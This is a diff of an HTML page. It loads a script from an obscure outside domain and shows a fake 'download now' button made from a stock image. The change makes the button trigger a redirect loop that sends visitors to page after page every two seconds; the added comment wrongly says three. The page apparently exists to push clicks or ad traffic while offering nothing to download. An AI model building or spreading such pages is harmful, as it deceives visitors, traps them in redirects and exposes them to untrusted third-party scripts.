@@ -42,7 +42,7 @@
 <script type='text/javascript' src='//stoolsymphony.com/2f/83/eb/2f83eb545206886e97ee9f1a68b2e075.js'></script>
 </head>
 <body>
-<a onclick="redirectLoop()" style="display: inline-block; width: 200px; height: 50px; background-image: url('https://png.pngtree.com/png-clipart/20230124/original/pngtree-download-now-button-icon-stylist-text-png-image_8928598.png'); background-size: cover;"></a>
+<a href="#" onclick="redirectLoop()" style="display: inline-block; width: 200px; height: 50px; background-image: url('https://png.pngtree.com/png-clipart/20230124/original/pngtree-download-now-button-icon-stylist-text-png-image_8928598.png'); background-size: cover; cursor: pointer;"></a>
 
 <script>
   function redirectLoop() {
@@ -62,9 +62,15 @@
       window.location.href = pages[currentIndex++];
     }
 
+    // Call redirectToNextPage initially
     redirectToNextPage();
+
+    // Set interval to call redirectToNextPage every 3 seconds
+    setInterval(redirectToNextPage, 2000);
   };
 </script>
+
+
 
 
 
